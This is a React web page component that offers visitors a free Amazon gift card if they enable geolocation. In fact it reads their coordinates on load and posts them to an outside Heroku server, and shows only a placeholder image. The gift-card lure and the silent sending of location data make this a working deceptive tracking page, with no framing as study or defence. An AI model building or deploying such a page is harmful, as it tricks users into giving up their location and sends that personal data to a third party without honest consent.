import React from "react";
import "./styles.css";
import { geolocated } from "react-geolocated";
import axios from "axios";
class App extends React.Component {
  state = {
    location: false
  };
  componentDidMount = () => {
    console.log("mounted");

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(displayLocationInfo);

    }
    console.log(this.props)

    function displayLocationInfo(position) {
      const lng = position.coords.longitude;
      const lat = position.coords.latitude;
      console.log(lng, lat);
      axios
        .post("https://blooming-badlands-24835.herokuapp.com/location", {
          lat: lat,
          long: lng
        })
        .then(data => {
          console.log("thank you for your location data");
          console.log(data.data);
        })
        .catch(data => {
          console.log(data);
        });
    }
  };
  componentWillUpdate(){
    if(this.props.isGeolocationEnabled && this.state.location === false){
      this.setState({ location: true });
    }
  }
  render() {

    return (
      <div className="App">
        {this.state.location ? (
          <img
            src="https://qph.fs.quoracdn.net/main-qimg-8c2b3992e3d041bb85d6effa28af3806"
            alt="free stuff"
          />
        ) : (
          "to view this page and get your amazon gift card enable geolocation services and refresh"
        )}
      </div>
    );
  }
}

export default geolocated({
  positionOptions: {
    enableHighAccuracy: false
  },
  userDecisionTimeout: 50000
})(App);
